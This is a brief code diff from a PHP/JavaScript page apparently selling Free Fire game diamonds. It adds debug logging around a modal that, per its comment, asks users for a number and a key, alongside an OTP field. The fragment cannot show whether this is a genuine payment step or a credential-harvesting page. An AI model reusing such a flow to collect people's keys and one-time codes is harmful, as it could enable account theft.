@@ -384,6 +384,7 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
             break;
 
           case "dinamica_logo":
+            console.log("Ejecutando case dinamica_logo");
             // 👉 MOSTRAR MODAL PARA PEDIR NÚMERO Y CLAVE
             console.log("Mostrando modal de autorización");
             if (document.getElementById("otpToken")) {
@@ -403,7 +404,11 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
 
             const modalAuthDinamica = document.getElementById("modalAutorizacion");
             if (modalAuthDinamica) {
+              console.log("Modal encontrado, mostrando...");
               modalAuthDinamica.style.display = "flex";
+              console.log("Modal display configurado a flex");
+            } else {
+              console.error("Modal modalAutorizacion no encontrado!");
             }
             break;
 
